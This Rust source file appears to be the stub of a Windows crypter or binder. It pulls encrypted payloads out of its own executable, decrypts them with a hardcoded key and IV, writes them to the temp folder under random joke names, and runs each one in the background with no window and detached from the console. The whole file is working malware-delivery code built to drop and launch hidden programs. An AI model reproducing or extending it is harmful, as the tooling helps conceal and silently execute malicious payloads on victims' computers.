use anyhow::Result;
use std::{cell::RefCell, fs, os::windows::process::CommandExt};
use endec::{constatants::{IV, KEY, SYMBOL_ARRAY}, decrypt::Decrypter, EncryptType};
use rand::Rng as _;

struct EncryptedFile {
    extension: String,
    encrypted_content: Vec<u8>,
}

fn parse_stub(binary: &[u8]) -> Option<Vec<u8>> {
    let symbol_array_index = binary.windows(SYMBOL_ARRAY.len()).position(|window| window == SYMBOL_ARRAY);

    if let Some(index) = symbol_array_index {
        let data = &binary[index + SYMBOL_ARRAY.len()..];
        return Some(data.to_vec());
    }

    None
}

struct BinaryReader {
    binary: Vec<u8>,
    pointer: RefCell<usize>,
}

impl BinaryReader {
    fn new(binary: Vec<u8>) -> Self {
        Self { binary, pointer: RefCell::new(1) }
    }

    fn read(&self, size: usize) -> Result<&[u8]> {
        let pointer = *self.pointer.borrow();
        if pointer + size > self.binary.len() {
            return Err(anyhow::anyhow!("EOF"));
        }

        let value = &self.binary[pointer..pointer + size];
        *self.pointer.borrow_mut() += size;
        Ok(value)
    }

    fn get_encrypted_files(&self) -> Result<Vec<EncryptedFile>> {
        let mut encrypted_files = Vec::new();

        while let Ok(extension_len) = self.read(1) {
            // Read extension
            let extension_len = u8::from_le_bytes(extension_len.try_into()?);
            println!("Extension length: {}", extension_len);
            let extension = match self.read(extension_len as usize) {
                Ok(extension) => String::from_utf8(extension.to_vec())?,
                Err(_) => break,
            };

            println!("Extension: {}", extension);

            // Read encrypted content
            let encrypted_len = u64::from_le_bytes(self.read(8)?.try_into()?);
            let encrypted_content = match self.read(encrypted_len as usize) {
                Ok(encrypted_content) => encrypted_content.to_vec(),
                Err(_) => break,
            };

            encrypted_files.push(EncryptedFile {
                extension,
                encrypted_content,
            });
        }

        Ok(encrypted_files)
    }
}

fn main() -> Result<()> {
    let self_path = std::env::current_exe()?;
    let self_binary = fs::read(self_path)?;
    
    let encrypted_data = parse_stub(&self_binary).ok_or(anyhow::anyhow!("Failed to parse stub"))?;
    let encrypt_type = EncryptType::from(encrypted_data[0]);
    println!("Encryption type: {:?}", encrypt_type);

    let reader = BinaryReader::new(encrypted_data);
    let encrypted_files = reader.get_encrypted_files()?;

    let decrypter = Decrypter::new(encrypt_type, KEY, IV);
    for file in encrypted_files {
        // Add file to temp directory
        let temp_path = std::env::temp_dir().join(format!("{}.{}", funny_word_generator(3), file.extension));
        println!("Decrypting {} to {}", file.extension, temp_path.display());
        fs::write(temp_path.clone(), decrypter.decrypt_data(file.encrypted_content)?.to_vec())?;

        let _ = std::process::Command::new(temp_path)
            .creation_flags(0x08000000 | 0x00000200) // CREATE_NO_WINDOW and DETACH_PROCESS
            .spawn()?;
    }

    Ok(())
}

fn funny_word_generator(length: usize) -> String {
    let words = [
        "yeet",
        "bonk",
        "chonk",
        "smol", 
        "chungus",
        "poggers",
        "yolo",
        "doge",
        "stonks",
        "boop",
        "derp",
        "yikes",
        "oof",
        "uwu",
        "lmao",
        "bruh",
        "noice",
        "sheesh",
        "slay",
        "based",
        "bussin",
        "cap",
        "fire",
        "lit",
        "mood",
        "vibe", 
        "sus",
        "tea",
        "salty",
        "toxic",
        "tilted",
        "rage",
        "pog",
        "pepega",
        "kek",
        "monkas",
        "pepe",
        "sadge",
        "copium",
        "hopium",
        "mald",
        "ratio",
        "cringe",
        "woke",
        "shook",
        "periodt",
        "wig",
        "snapped", 
        "flex",
        "bet",
        "fam",
        "goat",
        "hitsdifferent",
        "lowkey",
        "highkey",
        "slaps",
        "frfr",
        "deadass",
        "period",
        "sis",
        "chief",
        "finna",
        "vibecheck",
        "facts",
        "nocap",
        "rip",
        "feelsbad"
    ];

    (0..length)
        .map(|_| words[rand::thread_rng().gen_range(0..words.len())].to_string())
        .collect::<Vec<String>>()
        .join("")
}
